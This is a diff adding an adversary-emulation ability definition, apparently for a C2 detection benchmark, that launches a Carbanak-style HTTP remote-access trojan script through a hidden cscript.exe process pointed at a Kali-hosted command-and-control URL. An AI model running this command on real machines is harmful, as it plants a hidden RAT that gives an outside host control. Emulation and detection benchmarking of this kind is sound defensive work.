@@ -1,0 +1,20 @@
+---
+- id: 5fa2d563-6d8e-5326-ab34-037f7dce531b
+  name: Start AEL Carbanak script RAT [AEL-CARBANAK-RAT-001]
+  description: Starts one cscript.exe instance with the http-rat.js script.
+  tactic: command-and-control
+  technique:
+    attack_id: T1071.001
+    name: Web Protocols
+  repeatable: false
+  platforms:
+    windows:
+      psh:
+        command: >-
+          $runId = "#{c2trace.run_id}";
+          $script = Join-Path $env:ProgramData ("C2TraceBenchmark"+$runId+"\ael-carbanak-http-rat.js");
+          if (-not (Test-Path $script)) { throw };
+          $url = "https://#{c2trace.kali_ip}:18448/";
+          $cscript = Join-Path $env:SystemRoot "System32\cscript.exe";
+          $p = Start-Process -FilePath $cscript -ArgumentList @("//B","//NoLogo",$script,$url) -WindowStyle Hidden -PassThru;
+          $p.Id
